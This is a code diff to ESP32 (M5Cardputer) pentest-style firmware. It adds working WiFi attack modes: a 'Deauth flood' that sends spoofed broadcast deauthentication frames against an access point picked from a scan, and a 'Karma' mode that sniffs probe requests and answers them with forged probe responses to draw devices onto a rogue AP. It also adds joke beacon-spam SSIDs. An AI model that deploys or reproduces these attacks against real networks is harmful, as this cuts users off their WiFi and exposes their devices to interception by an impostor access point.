@@ -18,12 +18,14 @@ const char *const MENU_ITEMS[] = {"WiFi", "BLE", "RF 433MHz", "NRF24 2.4GHz", "I
 constexpr int MENU_COUNT = sizeof(MENU_ITEMS) / sizeof(MENU_ITEMS[0]);
 constexpr int WIFI_ITEM = 0;
 
-const char *const WIFI_TOOLS[] = {"Scan networks", "Channel analyzer", "Packet sniffer", "Beacon spam"};
+const char *const WIFI_TOOLS[] = {"Scan networks", "Channel analyzer", "Packet sniffer", "Beacon spam", "Deauth flood", "Karma"};
 constexpr int WIFI_TOOL_COUNT = sizeof(WIFI_TOOLS) / sizeof(WIFI_TOOLS[0]);
 constexpr int WIFI_TOOL_SCAN = 0;
 constexpr int WIFI_TOOL_CHANNELS = 1;
 constexpr int WIFI_TOOL_SNIFF = 2;
 constexpr int WIFI_TOOL_BEACON = 3;
+constexpr int WIFI_TOOL_DEAUTH = 4;
+constexpr int WIFI_TOOL_KARMA = 5;
 
 constexpr int WIFI_VISIBLE_ROWS = 8;
 constexpr int CH_FIRST = 1;
@@ -32,7 +34,7 @@ constexpr uint32_t CH_DWELL_MS = 300;
 constexpr int BAR_BASE_Y = 108;
 constexpr int BAR_MAX_H = 72;
 
-enum class Screen { Menu, Placeholder, WifiMenu, WifiScan, WifiChannels, WifiSniff, WifiSpamSelect, WifiSpamText, WifiSpamRun };
+enum class Screen { Menu, Placeholder, WifiMenu, WifiScan, WifiChannels, WifiSniff, WifiSpamSelect, WifiSpamText, WifiSpamRun, WifiDeauthSelect, WifiDeauthRun, WifiKarmaRun };
 
 Screen screen = Screen::Menu;
 int selected = 0;
@@ -534,10 +536,10 @@ void moveSnifferChannel(int delta) {
     drawSniffer();
 }
 
-constexpr int SPAM_MODE_COUNT = 4;
+constexpr int SPAM_MODE_COUNT = 5;
 const char *const SPAM_MODE_NAMES[SPAM_MODE_COUNT] = {"Funny names", "Random names", "Single name + counter",
-                                                       "Custom list (SD)"};
-enum SpamMode : uint8_t { SPAM_FUNNY, SPAM_RANDOM, SPAM_SINGLE, SPAM_CUSTOM };
+                                                       "Custom list (SD)", "Rick-roll names"};
+enum SpamMode : uint8_t { SPAM_FUNNY, SPAM_RANDOM, SPAM_SINGLE, SPAM_CUSTOM, SPAM_ROLL };
 constexpr char SPAM_CUSTOM_PATH[] = "/kaiju/ssids.txt";
 constexpr int SPAM_CUSTOM_MAX = 64;
 constexpr size_t SPAM_SSID_MAX = 32;
@@ -550,6 +552,10 @@ const char *const SPAM_FUNNY_NAMES[] = {
     "It Hurts When IP",              "Drop It Like Its Hotspot", "Loading Wi-Fi Please Wait",
     "Free Candy Hotspot"};
 constexpr int SPAM_FUNNY_COUNT = sizeof(SPAM_FUNNY_NAMES) / sizeof(SPAM_FUNNY_NAMES[0]);
+const char *const SPAM_ROLL_NAMES[] = {
+    "Never Gonna Give You WiFi", "Never Gonna Let You Disconnect", "Never Gonna Run Around Your Router",
+    "Never Gonna Drop Your Packets", "Never Gonna Make You Log In", "Never Gonna Let Your Signal Down"};
+constexpr int SPAM_ROLL_COUNT = sizeof(SPAM_ROLL_NAMES) / sizeof(SPAM_ROLL_NAMES[0]);
 constexpr uint8_t SPAM_RATES[] = {0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};
 
 int spamModeSel = 0;
@@ -587,12 +593,26 @@ void spamRandomName(char *out) {
     out[len] = '\0';
 }
 
-size_t buildBeacon(uint8_t *f, const char *ssid, const uint8_t mac[6], uint8_t ch) {
-    static const uint8_t head[10] = {0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+esp_err_t wifiTx(wifi_interface_t ifx, const uint8_t *frame, size_t len) {
+    esp_err_t err = esp_wifi_80211_tx(ifx, frame, static_cast<int>(len), true);
+    for (uint8_t i = 0; err == ESP_ERR_NO_MEM && i < 8; i++) {
+        delay(1);
+        err = esp_wifi_80211_tx(ifx, frame, static_cast<int>(len), true);
+    }
+    return err;
+}
+
+constexpr uint8_t BCAST_ADDR[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+
+size_t buildMgmt(uint8_t *f, uint8_t fc0, const uint8_t dst[6], const uint8_t src[6], const char *ssid, uint8_t ch) {
     uint8_t *p = f;
-    memcpy(p, head, sizeof(head));
-    memcpy(p + 10, mac, 6);
-    memcpy(p + 16, mac, 6);
+    p[0] = fc0;
+    p[1] = 0x00;
+    p[2] = 0x00;
+    p[3] = 0x00;
+    memcpy(p + 4, dst, 6);
+    memcpy(p + 10, src, 6);
+    memcpy(p + 16, src, 6);
     p[22] = 0x00;
     p[23] = 0x00;
     p += 24;
@@ -617,13 +637,12 @@ size_t buildBeacon(uint8_t *f, const char *ssid, const uint8_t mac[6], uint8_t c
     return static_cast<size_t>(p - f);
 }
 
+size_t buildBeacon(uint8_t *f, const char *ssid, const uint8_t mac[6], uint8_t ch) {
+    return buildMgmt(f, 0x80, BCAST_ADDR, mac, ssid, ch);
+}
+
 esp_err_t spamTx(const uint8_t *frame, size_t len) {
-    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, static_cast<int>(len), true);
-    for (uint8_t i = 0; err == ESP_ERR_NO_MEM && i < 8; i++) {
-        delay(1);
-        err = esp_wifi_80211_tx(WIFI_IF_STA, frame, static_cast<int>(len), true);
-    }
-    return err;
+    return wifiTx(WIFI_IF_STA, frame, len);
 }
 
 void spamSendName(const char *name) {
@@ -666,6 +685,9 @@ void spamRound() {
         break;
     case SPAM_CUSTOM:
         for (int i = 0; i < spamCustomCount; i++) spamSendName(spamCustom[i]);
+        break;
+    case SPAM_ROLL:
+        for (int i = 0; i < SPAM_ROLL_COUNT; i++) spamSendName(SPAM_ROLL_NAMES[i]);
         break;
     }
 }
@@ -785,6 +807,266 @@ void tickSpam() {
     }
 }
 
+constexpr size_t DEAUTH_LEN = 26;
+const uint8_t DEAUTH_TEMPLATE[DEAUTH_LEN] = {0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+                                             0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                                             0x00, 0x00, 0xf0, 0xff, 0x02, 0x00};
+const uint8_t KARMA_BSSID[6] = {0x02, 0x4b, 0x41, 0x52, 0x4d, 0x41};
+constexpr int KARMA_QUEUE = 8;
+
+struct KarmaReq {
+    uint8_t mac[6];
+    uint8_t ssidLen;
+    char ssid[SPAM_SSID_MAX + 1];
+};
+KarmaReq karmaQ[KARMA_QUEUE];
+std::atomic<uint32_t> karmaQHead{0};
+std::atomic<uint32_t> karmaQTail{0};
+std::atomic<uint32_t> karmaSeen{0};
+bool karmaRunning = false;
+int karmaCh = 6;
+uint32_t karmaResponses = 0;
+uint32_t karmaErrors = 0;
+uint32_t karmaLastDraw = 0;
+char karmaLast[SPAM_SSID_MAX + 1] = "";
+
+uint8_t deauthBssid[6] = {0};
+int deauthCh = 1;
+char deauthSsid[SPAM_SSID_MAX + 1] = "";
+bool deauthRunning = false;
+uint32_t deauthBursts = 0;
+uint32_t deauthSent = 0;
+uint32_t deauthErrors = 0;
+uint32_t deauthLastBurst = 0;
+uint32_t deauthLastDraw = 0;
+
+void attackRadio() {
+    if (WiFi.getMode() != WIFI_AP_STA) {
+        WiFi.mode(WIFI_AP_STA);
+        WiFi.softAP("KaijuAtk", nullptr, 1, 1, 4, false);
+    }
+}
+
+void drawNetList(const char *title, const char *footer) {
+    auto &d = M5Cardputer.Display;
+    d.fillScreen(COLOR_BG);
+    d.setTextSize(1);
+    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
+    char header[40];
+    snprintf(header, sizeof(header), "%s: %d found", title, netCount);
+    d.drawString(header, 4, 4);
+    for (int row = 0; row < WIFI_VISIBLE_ROWS; row++) {
+        int idx = netTop + row;
+        if (idx >= netCount) break;
+        int y = 18 + row * 12;
+        if (idx == netSel) {
+            d.fillRect(0, y - 1, d.width(), 11, COLOR_PRIMARY);
+            d.setTextColor(COLOR_BG, COLOR_PRIMARY);
+        } else {
+            d.setTextColor(COLOR_PRIMARY, COLOR_BG);
+        }
+        String ssid = WiFi.SSID(idx);
+        if (ssid.length() == 0) ssid = "<hidden>";
+        char line[48];
+        snprintf(line, sizeof(line), "%-16.16s %4ld dBm ch%-2ld", ssid.c_str(), (long)WiFi.RSSI(idx),
+                 (long)WiFi.channel(idx));
+        d.drawString(line, 4, y);
+    }
+    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
+    d.drawString(footer, 4, 124);
+}
+
+void drawDeauthSelect() {
+    drawNetList("Deauth: pick AP", "Enter attack  Bksp back");
+}
+
+void enterDeauthSelect() {
+    attackRadio();
+    drawWifiMessage("Scanning...");
+    WiFi.scanDelete();
+    int n = WiFi.scanNetworks();
+    netCount = n > 0 ? n : 0;
+    netSel = 0;
+    netTop = 0;
+    drawDeauthSelect();
+}
+
+void moveDeauthSelection(int delta) {
+    int next = netSel + delta;
+    if (next < 0 || next >= netCount) return;
+    netSel = next;
+    if (netSel < netTop) netTop = netSel;
+    if (netSel >= netTop + WIFI_VISIBLE_ROWS) netTop = netSel - WIFI_VISIBLE_ROWS + 1;
+    drawDeauthSelect();
+}
+
+void chooseDeauthTarget() {
+    WiFi.BSSID(netSel, deauthBssid);
+    snprintf(deauthSsid, sizeof(deauthSsid), "%s", WiFi.SSID(netSel).c_str());
+    deauthCh = static_cast<int>(WiFi.channel(netSel));
+}
+
+void deauthBurst() {
+    uint8_t frame[DEAUTH_LEN];
+    memcpy(frame, DEAUTH_TEMPLATE, DEAUTH_LEN);
+    memcpy(frame + 10, deauthBssid, 6);
+    memcpy(frame + 16, deauthBssid, 6);
+    deauthBursts++;
+    for (int i = 0; i < 3; i++) {
+        if (wifiTx(WIFI_IF_AP, frame, DEAUTH_LEN) == ESP_OK) {
+            deauthSent++;
+        } else {
+            deauthErrors++;
+        }
+        delay(1);
+    }
+}
+
+void drawDeauthRun() {
+    auto &d = M5Cardputer.Display;
+    d.fillScreen(COLOR_BG);
+    d.setTextSize(1);
+    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
+    char line[48];
+    snprintf(line, sizeof(line), "Deauth  ch%-2d  %s", deauthCh, deauthRunning ? "RUNNING" : "stopped");
+    d.drawString(line, 4, 4);
+    snprintf(line, sizeof(line), "AP: %s", deauthSsid);
+    d.drawString(line, 4, 18);
+    snprintf(line, sizeof(line), "Bursts %lu  sent %lu  errors %lu", (unsigned long)deauthBursts,
+             (unsigned long)deauthSent, (unsigned long)deauthErrors);
+    d.drawString(line, 4, 32);
+    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
+    d.drawString("Enter run  ;. ch  Bksp back", 4, 124);
+}
+
+void startDeauth() {
+    attackRadio();
+    setAnalyzerChannel(deauthCh);
+    deauthBursts = 0;
+    deauthSent = 0;
+    deauthErrors = 0;
+    deauthLastBurst = 0;
+    deauthLastDraw = 0;
+    deauthRunning = true;
+    drawDeauthRun();
+}
+
+void stopDeauth() {
+    deauthRunning = false;
+}
+
+void tickDeauth() {
+    if (!deauthRunning) return;
+    uint32_t now = millis();
+    if (now - deauthLastBurst >= 50) {
+        deauthLastBurst = now;
+        deauthBurst();
+    }
+    if (now - deauthLastDraw >= 1000) {
+        deauthLastDraw = now;
+        drawDeauthRun();
+    }
+}
+
+void enqueueKarma(const uint8_t *mac, const uint8_t *ssid, uint8_t len) {
+    uint32_t head = karmaQHead.load(std::memory_order_relaxed);
+    uint32_t tail = karmaQTail.load(std::memory_order_acquire);
+    if (head - tail >= KARMA_QUEUE) return;
+    KarmaReq &r = karmaQ[head % KARMA_QUEUE];
+    memcpy(r.mac, mac, 6);
+    memcpy(r.ssid, ssid, len);
+    r.ssid[len] = '\0';
+    r.ssidLen = len;
+    karmaQHead.store(head + 1, std::memory_order_release);
+}
+
+void onKarma(void *buf, wifi_promiscuous_pkt_type_t type) {
+    if (type != WIFI_PKT_MGMT) return;
+    auto *pkt = static_cast<wifi_promiscuous_pkt_t *>(buf);
+    uint32_t len = pkt->rx_ctrl.sig_len;
+    if (len < 28 || ((pkt->payload[0] >> 4) & 0xF) != 0x4) return;
+    karmaSeen.fetch_add(1, std::memory_order_relaxed);
+    uint32_t end = len - 4;
+    uint32_t p = 24;
+    while (p + 2 <= end) {
+        uint8_t tag = pkt->payload[p];
+        uint8_t tlen = pkt->payload[p + 1];
+        if (p + 2 + tlen > end) return;
+        if (tag == 0) {
+            if (tlen > 0 && tlen <= SPAM_SSID_MAX) enqueueKarma(&pkt->payload[10], &pkt->payload[p + 2], tlen);
+            return;
+        }
+        p += 2 + tlen;
+    }
+}
+
+void drawKarmaRun() {
+    auto &d = M5Cardputer.Display;
+    d.fillScreen(COLOR_BG);
+    d.setTextSize(1);
+    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
+    char line[48];
+    snprintf(line, sizeof(line), "Karma  ch%-2d  %s", karmaCh, karmaRunning ? "RUNNING" : "stopped");
+    d.drawString(line, 4, 4);
+    snprintf(line, sizeof(line), "Probes seen %lu", (unsigned long)karmaSeen.load(std::memory_order_relaxed));
+    d.drawString(line, 4, 18);
+    snprintf(line, sizeof(line), "Responses %lu  errors %lu", (unsigned long)karmaResponses,
+             (unsigned long)karmaErrors);
+    d.drawString(line, 4, 32);
+    snprintf(line, sizeof(line), "Last: %s", karmaLast);
+    d.drawString(line, 4, 46);
+    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
+    d.drawString("Enter run  ;. ch  Bksp back", 4, 124);
+}
+
+void startKarma() {
+    attackRadio();
+    karmaQHead.store(0, std::memory_order_release);
+    karmaQTail.store(0, std::memory_order_release);
+    karmaSeen.store(0, std::memory_order_relaxed);
+    karmaResponses = 0;
+    karmaErrors = 0;
+    karmaLast[0] = '\0';
+    karmaLastDraw = 0;
+    setAnalyzerChannel(karmaCh);
+    wifi_promiscuous_filter_t filter = {WIFI_PROMIS_FILTER_MASK_MGMT};
+    esp_wifi_set_promiscuous_filter(&filter);
+    esp_wifi_set_promiscuous_rx_cb(&onKarma);
+    esp_wifi_set_promiscuous(true);
+    karmaRunning = true;
+    drawKarmaRun();
+}
+
+void stopKarma() {
+    if (!karmaRunning) return;
+    karmaRunning = false;
+    esp_wifi_set_promiscuous(false);
+}
+
+void tickKarma() {
+    if (!karmaRunning) return;
+    uint32_t tail = karmaQTail.load(std::memory_order_relaxed);
+    uint32_t head = karmaQHead.load(std::memory_order_acquire);
+    uint8_t frame[SPAM_FRAME_MAX];
+    for (int n = 0; tail != head && n < 4; n++) {
+        KarmaReq &r = karmaQ[tail % KARMA_QUEUE];
+        size_t len = buildMgmt(frame, 0x50, r.mac, KARMA_BSSID, r.ssid, static_cast<uint8_t>(karmaCh));
+        if (wifiTx(WIFI_IF_AP, frame, len) == ESP_OK) {
+            karmaResponses++;
+        } else {
+            karmaErrors++;
+        }
+        snprintf(karmaLast, sizeof(karmaLast), "%s", r.ssid);
+        tail++;
+    }
+    karmaQTail.store(tail, std::memory_order_release);
+    uint32_t now = millis();
+    if (now - karmaLastDraw >= 1000) {
+        karmaLastDraw = now;
+        drawKarmaRun();
+    }
+}
+
 bool wordHas(const std::vector<char> &word, char c) {
     for (char w : word) {
         if (tolower(w) == c) return true;
@@ -811,6 +1093,8 @@ void loop() {
         tickSniffer();
     }
     if (screen == Screen::WifiSpamRun) tickSpam();
+    if (screen == Screen::WifiDeauthRun) tickDeauth();
+    if (screen == Screen::WifiKarmaRun) tickKarma();
     if (!M5Cardputer.Keyboard.isChange() || !M5Cardputer.Keyboard.isPressed()) return;
 
     auto &ks = M5Cardputer.Keyboard.keysState();
@@ -869,6 +1153,12 @@ void loop() {
                 screen = Screen::WifiSpamSelect;
                 spamMsg[0] = '\0';
                 drawSpamSelect();
+            } else if (wifiToolSel == WIFI_TOOL_DEAUTH) {
+                screen = Screen::WifiDeauthSelect;
+                enterDeauthSelect();
+            } else if (wifiToolSel == WIFI_TOOL_KARMA) {
+                screen = Screen::WifiKarmaRun;
+                startKarma();
             }
         }
         break;
@@ -999,6 +1289,62 @@ void loop() {
                 setAnalyzerChannel(spamCh);
             }
             drawSpamRun();
+        }
+        break;
+    case Screen::WifiDeauthSelect:
+        if (back) {
+            screen = Screen::WifiMenu;
+            drawWifiMenu();
+        } else if (up) {
+            moveDeauthSelection(-1);
+        } else if (down) {
+            moveDeauthSelection(1);
+        } else if (ks.enter) {
+            if (netCount > 0) {
+                chooseDeauthTarget();
+                screen = Screen::WifiDeauthRun;
+                drawDeauthRun();
+            }
+        }
+        break;
+
+    case Screen::WifiDeauthRun:
+        if (back) {
+            stopDeauth();
+            screen = Screen::WifiDeauthSelect;
+            drawDeauthSelect();
+        } else if (ks.enter) {
+            if (deauthRunning) {
+                stopDeauth();
+            } else {
+                startDeauth();
+            }
+            drawDeauthRun();
+        } else if (up || down) {
+            deauthCh = up ? (deauthCh <= CH_FIRST ? CH_LAST : deauthCh - 1)
+                          : (deauthCh >= CH_LAST ? CH_FIRST : deauthCh + 1);
+            setAnalyzerChannel(deauthCh);
+            drawDeauthRun();
+        }
+        break;
+
+    case Screen::WifiKarmaRun:
+        if (back) {
+            stopKarma();
+            screen = Screen::WifiMenu;
+            drawWifiMenu();
+        } else if (ks.enter) {
+            if (karmaRunning) {
+                stopKarma();
+            } else {
+                startKarma();
+            }
+            drawKarmaRun();
+        } else if (up || down) {
+            karmaCh = up ? (karmaCh <= CH_FIRST ? CH_LAST : karmaCh - 1)
+                         : (karmaCh >= CH_LAST ? CH_FIRST : karmaCh + 1);
+            if (karmaRunning) setAnalyzerChannel(karmaCh);
+            drawKarmaRun();
         }
         break;
     }
